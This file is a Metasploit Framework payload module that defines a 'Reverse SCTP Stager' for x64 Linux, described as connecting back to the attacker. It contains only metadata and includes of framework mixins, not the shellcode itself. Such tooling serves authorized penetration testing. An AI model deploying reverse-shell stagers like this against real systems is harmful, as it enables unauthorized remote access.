##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

module MetasploitModule
  CachedSize = 136

  include Msf::Payload::Stager
  include Msf::Payload::Linux::ReverseSctp_x64

  def initialize(info = {})
    super(
      merge_info(
        info,
        'Name' => 'Reverse SCTP Stager',
        'Description' => 'Connect back to the attacker',
        'Author' => 'RageLtMan <rageltman[at]sempervictus>',
        'License' => MSF_LICENSE,
        'Platform' => 'linux',
        'Arch' => ARCH_X64,
        'Handler' => Msf::Handler::ReverseSctp,
        'Stager' => { 'Payload' => '' }
      )
    )
  end
end
